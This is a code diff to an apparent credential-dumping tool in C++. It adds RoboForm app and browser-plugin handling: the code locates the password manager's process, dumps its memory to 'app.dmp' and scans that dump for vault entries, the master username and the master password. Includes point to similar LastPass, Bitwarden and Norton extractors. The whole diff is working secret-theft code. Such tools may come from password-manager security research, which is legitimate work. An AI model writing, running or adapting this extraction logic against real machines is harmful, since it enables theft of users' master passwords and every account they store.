@@ -29,7 +29,10 @@
 #include "../lastpass/getCredslastpassEntries.h"
 #include "../lastpass/getCredslastpassMasterPass.h"
 #include "../lastpass/getCredslastpassMasterUsername.h"
-#include "../roboform/getCredsroboform.h"
+#include "../roboform/plugin/getCredsroboformplugin.h"
+#include "../roboform/app/getCredsroboformapp.h"
+#include "../roboform/app/getCredsroboformapp2.h"
+#include "../roboform/app/getCredsroboformapp3.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
 #include "../norton/getCredsnorton.h"
@@ -811,84 +814,136 @@ int checkApps() {
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
 
-    //roboform
+    //roboform app
+    std::string userInput3;
     if (userInput == "roboform") {
-        std::cout << "User input matches 'roboform'.\n";
-        std::cout << "In this browser plugin, the first largest process is needed.\n";
-        std::cout << "Only entries should be available.\n";
-        std::cout << "For now, this only works with Chrome.\n";
-        const char* processName = "chrome.exe";
+        std::cout << "Enter 0 if it is Roboform browser plugin, otherwise enter 1 (app): ";
+        std::cin >> userInput3;
 
-        wchar_t username[256];
-        DWORD usernameSize = sizeof(username) / sizeof(username[0]);
+        if (userInput3 == "1") {
+            std::cout << "User input matches 'Roboform' app.\n";
+            std::cout << "Fast and Full are the same for this app.\n";
+            std::cout << "Roboform contains all relevant credentials (master pass, entries, etc.).\n";
 
-        if (GetUserNameW(username, &usernameSize)) {
-            // Replace this value with the extension name you want to check
-            std::wstring extensionName = L"pnlccmojcmeohlpggmfnbbiapkmbliob";
-
-            if (findPlugin(username, extensionName)) {
-                std::wcout << L"Directory exists!" << std::endl;
+            if (mode == "local") {
+                std::cout << "Searching for entries (1/2).\n";
+                getCredsroboformapp(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Searching for master password (2/2).\n";
+                getCredsroboformapp2(fileInput);
+                std::cout << "Done!\n";
             }
-            else {
-                std::wcout << L"Directory does not exist." << std::endl;
-                std::wcout << L"Stop execution.\n" << std::endl;
-                return 1;
-            }
-        }
-        else {
-            std::wcerr << L"Failed to get the current user's login name." << std::endl;
-            return 1;
-        }
+            else if (mode == "fast" || mode == "full") {
+                std::cout << "User input was for Roboform.\n";
+                fileInput = "app.dmp";
+                const char* processName = "robotaskbaricon.exe";
 
-        // Step 1: Find PIDs by process name
-        std::vector<DWORD> pids;
+                // Step 1: Find PIDs by process name
+                DWORD pid = FindSimpleProcPID(processName);
 
-        if (mode == "fast") {
-
-            pids = FindPIDsByProcessName(processName);
-
-            if (!pids.empty())
-            {
-                // Step 2: Get Private Working Set sizes for the found PIDs
-                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
-
-                // Step 3: Find the PID with the first-largest Private Working Set size
-                DWORD firstLargestPID = FindFirstPID(pidSizePairs);
-
-                if (firstLargestPID != 0)
+                if (pid != 0)
                 {
-                    // Step 4: Create a dump file for the process with the first-largest size
-                    saveDump(firstLargestPID);
+                    // Step 2: Create a dump file for the process with the second-largest size
+                    saveDump(pid);
                 }
                 else
                 {
-                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
+                    std::cerr << "No process with this PID found." << std::endl;
                 }
+                std::cout << "Searching for entries (1/3).\n";
+                getCredsroboformapp(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Searching for master username (2/3).\n";
+                getCredsroboformapp3(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Searching for master password (3/3).\n";
+                getCredsroboformapp2(fileInput);
+                std::cout << "Done!\n";
+                
             }
-            else
-            {
-                std::cerr << "No processes with the specified name found." << std::endl;
-            }
-            fileInput = "app.dmp";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
         }
 
-        if (mode == "full") {
-            pids = FindPIDsByProcessName(processName);
+        //roboform browser plugin
+        if (userInput == "roboform" && userInput3 == "0") {
+            std::cout << "User input matches 'roboform' browser plugin.\n";
+            std::cout << "User input matches 'roboform'.\n";
+            std::cout << "In this browser plugin, the first largest process is needed.\n";
+            std::cout << "Only entries should be available.\n";
+            std::cout << "For now, this only works with Chrome.\n";
+            const char* processName = "chrome.exe";
 
-            for (DWORD pid : pids) {
-                std::wcout << L"Process PID: " << pid << std::endl;
-                createFileFromMultiPIDs(pid);
+            wchar_t username[256];
+            DWORD usernameSize = sizeof(username) / sizeof(username[0]);
+
+            if (GetUserNameW(username, &usernameSize)) {
+                // Replace this value with the extension name you want to check
+                std::wstring extensionName = L"pnlccmojcmeohlpggmfnbbiapkmbliob";
+
+                if (findPlugin(username, extensionName)) {
+                    std::wcout << L"Directory exists!" << std::endl;
+                }
+                else {
+                    std::wcout << L"Directory does not exist." << std::endl;
+                    std::wcout << L"Stop execution.\n" << std::endl;
+                    return 1;
+                }
+                }
+            else {
+                std::wcerr << L"Failed to get the current user's login name." << std::endl;
+                return 1;
             }
 
-            fileInput = "app.dmp";
-        }
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids;
 
-        std::cout << "Searching for entries.\n";
-        getCredsroboform(fileInput);
-        std::cout << "Done!\n";
-        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+            if (mode == "fast") {
+
+                pids = FindPIDsByProcessName(processName);
+
+                if (!pids.empty())
+                {
+                    // Step 2: Get Private Working Set sizes for the found PIDs
+                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                    // Step 3: Find the PID with the first-largest Private Working Set size
+                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);
+
+                    if (firstLargestPID != 0)
+                    {
+                        // Step 4: Create a dump file for the process with the first-largest size
+                        saveDump(firstLargestPID);
+                    }
+                    else
+                    {
+                        std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
+                    }
+                }
+                else
+                {
+                    std::cerr << "No processes with the specified name found." << std::endl;
+                }
+                fileInput = "app.dmp";
+            }
+
+            if (mode == "full") {
+                pids = FindPIDsByProcessName(processName);
+                for (DWORD pid : pids) {
+                    std::wcout << L"Process PID: " << pid << std::endl;
+                    createFileFromMultiPIDs(pid);
+                }
+
+                fileInput = "app.dmp";
+            }
+
+            std::cout << "Searching for entries.\n";
+            getCredsroboformplugin(fileInput);
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+            }
     }
 
+    
     //bitwarden
     if (userInput == "bitwarden") {
         std::cout << "User input matches 'bitwarden'.\n";
